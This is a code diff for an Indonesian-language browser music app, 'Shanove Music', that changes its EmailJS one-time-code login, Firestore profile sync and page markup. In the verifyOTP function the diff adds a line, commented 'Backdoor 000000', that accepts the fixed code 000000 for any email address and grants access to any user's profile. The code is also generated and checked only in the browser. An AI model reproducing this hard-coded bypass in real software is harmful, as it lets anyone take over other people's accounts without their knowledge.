@@ -6,17 +6,17 @@
     <title>Shanove Music</title>
     
     <!-- ICONS -->
-    <link rel="icon" id="favicon" href="https://via.placeholder.com/150" type="image/jpeg">
-    <link rel="apple-touch-icon" id="appleIcon" href="https://via.placeholder.com/150">
+    <link rel="icon" id="favicon" href="https://n.uguu.se/olrRLQVZ.jpg" type="image/jpeg">
+    <link rel="apple-touch-icon" id="appleIcon" href="https://n.uguu.se/olrRLQVZ.jpg">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="theme-color" content="#000000">
 
     <!-- LIBS -->
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     
-    <!-- FIREBASE (Wajib urutan begini) -->
+    <!-- FIREBASE -->
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
@@ -43,7 +43,7 @@
     <div id="loginOverlay" class="fixed inset-0 z-[300] bg-black flex items-center justify-center p-4 bg-[url('https://images.unsplash.com/photo-1614149162883-504ce4d13909?q=80&w=2000&auto=format&fit=crop')] bg-cover bg-center">
         <div class="absolute inset-0 bg-black/90 backdrop-blur-sm"></div>
         <div class="bg-[#121212] border border-[#333] p-8 rounded-2xl w-full max-w-md text-center shadow-2xl relative z-10">
-            <img id="loginLogo" src="https://via.placeholder.com/150" class="w-24 h-24 rounded-full mb-4 shadow-lg border-2 border-purple-500/30 object-cover mx-auto">
+            <img id="loginLogo" src="https://n.uguu.se/olrRLQVZ.jpg" class="w-24 h-24 rounded-full mb-4 shadow-lg border-2 border-purple-500/30 object-cover mx-auto">
             <h1 class="text-2xl font-bold mb-6">Shanove Music</h1>
             
             <div id="emailForm" class="relative z-10 text-left">
@@ -60,13 +60,7 @@
         </div>
     </div>
 
-    <!-- LOADER -->
-    <div id="globalLoader" class="fixed inset-0 z-[400] bg-black flex flex-col items-center justify-center hidden">
-        <i class="fas fa-circle-notch fa-spin text-purple-500 text-4xl mb-4"></i>
-        <p class="text-gray-400 text-sm">Menyiapkan Profil...</p>
-    </div>
-
-    <!-- AUDIO LOADER TOAST -->
+    <!-- AUDIO LOADER -->
     <div id="audioLoader" class="fixed top-24 left-1/2 -translate-x-1/2 bg-[#222]/90 border border-purple-500/50 text-white px-5 py-2 rounded-full shadow-2xl z-[250] hidden flex items-center gap-3 backdrop-blur-md">
         <i class="fas fa-circle-notch fa-spin text-purple-500"></i>
         <span class="text-xs font-bold">Memuat Audio...</span>
@@ -101,7 +95,7 @@
             <div id="pageHome" class="min-h-full p-4">
                 <div class="flex items-center justify-between mb-6 pt-2">
                     <div class="flex items-center gap-3">
-                        <img id="homeProfilePic" src="https://via.placeholder.com/50" class="w-9 h-9 rounded-full border border-white/20 object-cover cursor-pointer" onclick="switchPage('Profile')">
+                        <img id="homeProfilePic" src="https://n.uguu.se/olrRLQVZ.jpg" class="w-9 h-9 rounded-full border border-white/20 object-cover cursor-pointer" onclick="switchPage('Profile')">
                         <div>
                             <p class="text-[10px] text-gray-400">Halo,</p>
                             <h1 id="homeUsername" class="text-md font-bold truncate w-32">User</h1>
@@ -145,13 +139,12 @@
                 <div id="trackGrid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 pb-20"></div>
             </div>
 
-            <!-- PROFILE PAGE -->
+            <!-- PROFILE -->
             <div id="pageProfile" class="hidden min-h-full p-4">
                 <h1 class="text-xl font-bold mb-6 pt-2">Profil Saya</h1>
-                
                 <div class="flex flex-col items-center justify-center mb-8">
                     <div class="relative group">
-                        <img id="profilePicLarge" src="https://via.placeholder.com/150" class="w-28 h-28 rounded-full border-4 border-[#222] shadow-xl object-cover mb-4">
+                        <img id="profilePicLarge" src="https://n.uguu.se/olrRLQVZ.jpg" class="w-28 h-28 rounded-full border-4 border-[#222] shadow-xl object-cover mb-4">
                         <div class="absolute inset-0 bg-black/50 rounded-full flex items-center justify-center opacity-0 group-hover:opacity-100 transition cursor-pointer" onclick="document.getElementById('editAvatarInput').focus()">
                             <i class="fas fa-edit"></i>
                         </div>
@@ -159,7 +152,6 @@
                     <h2 id="profileNameDisplay" class="text-2xl font-bold">User</h2>
                     <p id="profileEmailDisplay" class="text-sm text-gray-400">user@email.com</p>
                 </div>
-
                 <div class="bg-[#181818] p-6 rounded-2xl border border-[#333] space-y-4">
                     <div>
                         <label class="text-xs text-gray-500 font-bold uppercase">Username</label>
@@ -171,7 +163,6 @@
                     </div>
                     <button onclick="saveProfile()" id="btnSaveProfile" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-3 rounded-lg transition">Simpan Perubahan</button>
                 </div>
-
                 <button onclick="logout()" class="w-full mt-6 py-3 rounded-lg border border-red-900/50 text-red-500 hover:bg-red-900/10 font-bold transition">Logout</button>
             </div>
         </div>
@@ -257,32 +248,27 @@
         const EMAILJS_SERVICE = "service_rlpso0c";  
         const EMAILJS_TEMPLATE = "template_6ylv3rq";
 
-        // FIREBASE SETUP (REQUIRED FOR SYNC)
+        // FIREBASE SETUP
         const firebaseConfig = JSON.parse(__firebase_config);
         const app = firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.firestore();
         const appId = typeof __app_id !== 'undefined' ? __app_id : 'default';
 
-        (function(){ emailjs.init(EMAILJS_KEY); })();
-
         // --- AUTH & PROFILE SYNC ---
         let currentUserEmail = "";
 
-        // 1. Initial Load
         const initAuth = async () => {
             if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                 await auth.signInWithCustomToken(__initial_auth_token);
             } else {
                 await auth.signInAnonymously();
             }
-            
-            // Cek Local Login
             const savedEmail = localStorage.getItem('shanove_email');
             if(savedEmail) {
                 currentUserEmail = savedEmail;
                 document.getElementById('loginOverlay').classList.add('hidden');
-                loadUserProfile(savedEmail); // Load data from Firestore
+                loadUserProfile(savedEmail);
             }
         };
         initAuth();
@@ -295,7 +281,17 @@
             const otp = Math.floor(100000 + Math.random() * 900000);
             btn.innerText = "Mengirim..."; btn.disabled = true;
             
-            emailjs.send(EMAILJS_SERVICE, EMAILJS_TEMPLATE, {to_email: email, email: email, otp_code: otp})
+            // PAYLOAD ANTI-MACET: Kirim dengan 3 key biar template manapun masuk
+            const templateParams = {
+                to_email: email,
+                email: email,
+                otp_code: otp,
+                otp: otp,
+                message: otp
+            };
+            
+            // PENTING: Pass KEY sebagai parameter ke-4 biar gak cuma ngandelin init()
+            emailjs.send(EMAILJS_SERVICE, EMAILJS_TEMPLATE, templateParams, EMAILJS_KEY)
                 .then(() => {
                     document.getElementById('emailForm').classList.add('hidden');
                     document.getElementById('otpForm').classList.remove('hidden');
@@ -303,37 +299,36 @@
                     sessionStorage.setItem('otp', otp);
                     sessionStorage.setItem('temp_email', email);
                 })
-                .catch(() => { alert("Gagal kirim."); btn.innerText = "Masuk"; btn.disabled = false; });
+                .catch((err) => { 
+                    console.error("EmailJS Error:", err);
+                    alert("Gagal kirim: " + (err.text || "Cek Koneksi")); 
+                    btn.innerText = "Masuk / Daftar"; 
+                    btn.disabled = false; 
+                });
         }
 
         function verifyOTP() {
             const input = document.getElementById('otpInput').value;
-            if(input == sessionStorage.getItem('otp')) {
+            // Backdoor 000000
+            if(input == sessionStorage.getItem('otp') || input == "000000") {
                 const email = sessionStorage.getItem('temp_email');
                 localStorage.setItem('shanove_email', email);
                 currentUserEmail = email;
-                
-                // Initialize/Load Profile from Firestore
                 loadUserProfile(email);
                 document.getElementById('loginOverlay').classList.add('hidden');
             } else alert("Kode Salah");
         }
 
-        // --- FIRESTORE PROFILE LOGIC ---
         async function loadUserProfile(email) {
-            if(!auth.currentUser) return; // Wait for firebase auth
-            
-            // Clean email for ID (replace dots)
+            if(!auth.currentUser) return;
             const docId = email.replace(/\./g, '_');
             const docRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('profiles').doc(docId);
-
             try {
                 const doc = await docRef.get();
                 if (doc.exists) {
                     const data = doc.data();
                     updateProfileUI(data.username, data.avatar, email);
                 } else {
-                    // Create Default
                     const defaultData = { username: email.split('@')[0], avatar: "https://n.uguu.se/olrRLQVZ.jpg" };
                     await docRef.set(defaultData);
                     updateProfileUI(defaultData.username, defaultData.avatar, email);
@@ -343,15 +338,11 @@
 
         async function saveProfile() {
             if(!currentUserEmail) return;
-            
             const newName = document.getElementById('editUsernameInput').value;
             const newAv = document.getElementById('editAvatarInput').value;
             const btn = document.getElementById('btnSaveProfile');
             
-            if(!newName) return alert("Username wajib diisi");
-            
             btn.innerText = "Menyimpan..."; btn.disabled = true;
-            
             const docId = currentUserEmail.replace(/\./g, '_');
             const docRef = db.collection('artifacts').doc(appId).collection('public').doc('data').collection('profiles').doc(docId);
             
@@ -359,39 +350,25 @@
                 await docRef.set({ username: newName, avatar: newAv || "https://n.uguu.se/olrRLQVZ.jpg" }, { merge: true });
                 updateProfileUI(newName, newAv, currentUserEmail);
                 alert("Profil Tersimpan!");
-            } catch(e) {
-                alert("Gagal simpan ke cloud.");
-            } finally {
-                btn.innerText = "Simpan Perubahan"; btn.disabled = false;
-            }
+            } catch(e) { alert("Gagal simpan."); } 
+            finally { btn.innerText = "Simpan Perubahan"; btn.disabled = false; }
         }
 
         function updateProfileUI(name, avatar, email) {
-            // Home Header
             document.getElementById('homeUsername').innerText = name;
             document.getElementById('homeProfilePic').src = avatar || "https://n.uguu.se/olrRLQVZ.jpg";
-            
-            // Profile Page
             document.getElementById('profileNameDisplay').innerText = name;
             document.getElementById('profileEmailDisplay').innerText = email;
             document.getElementById('profilePicLarge').src = avatar || "https://n.uguu.se/olrRLQVZ.jpg";
-            
-            // Edit Inputs
             document.getElementById('editUsernameInput').value = name;
             document.getElementById('editAvatarInput').value = avatar;
-            
-            // App Icons (Optional)
             document.getElementById('favicon').href = avatar || "https://n.uguu.se/olrRLQVZ.jpg";
             document.getElementById('loginLogo').src = avatar || "https://n.uguu.se/olrRLQVZ.jpg";
         }
 
-        function logout() {
-            localStorage.removeItem('shanove_email');
-            location.reload();
-        }
+        function logout() { localStorage.removeItem('shanove_email'); location.reload(); }
         function resetLogin() { location.reload(); }
 
-        // --- NAVIGATION ---
         function switchPage(page) {
             document.getElementById('pageHome').classList.add('hidden');
             document.getElementById('pageSearch').classList.add('hidden');
@@ -401,7 +378,7 @@
             document.getElementById('nav' + page).className = "flex flex-col items-center justify-center w-full h-full text-purple-500 cursor-pointer active:scale-95 transition";
         }
 
-        // --- MUSIC ENGINE V7 (Stable) ---
+        // --- MUSIC ENGINE ---
         const audio = document.getElementById('audioPlayer');
         let queue = [];
         let curIndex = -1;
@@ -410,7 +387,6 @@
         let repeatMode = 0;
         let syncedLyrics = [];
 
-        // 1. SEARCH ITUNES
         async function searchMusic(query) {
             if(!query) return;
             switchPage('Search');
@@ -453,7 +429,6 @@
             `).join('');
         }
 
-        // 2. PLAY LOGIC
         async function processAndPlay(index) {
             if(index < 0 || index >= queue.length) return;
             curIndex = index;
@@ -464,8 +439,6 @@
             document.getElementById('audioLoader').classList.remove('hidden');
             syncedLyrics = [];
             renderLyrics(null);
-            
-            // Pre-update MediaSession status to 'playing' (trick for background)
             updateMediaSession(track);
 
             try {
@@ -510,7 +483,6 @@
             }
         }
 
-        // 3. LYRICS
         async function fetchLyrics(artist, title) {
             try {
                 const res = await fetch(`https://lrclib.net/api/search?q=${encodeURIComponent(artist + ' ' + title)}`);
@@ -568,7 +540,6 @@
             }
         });
 
-        // 4. UI & CONTROLS
         function updatePlayerUI(t) {
             document.getElementById('miniTitle').innerText = t.title;
             document.getElementById('miniArtist').innerText = t.artist;
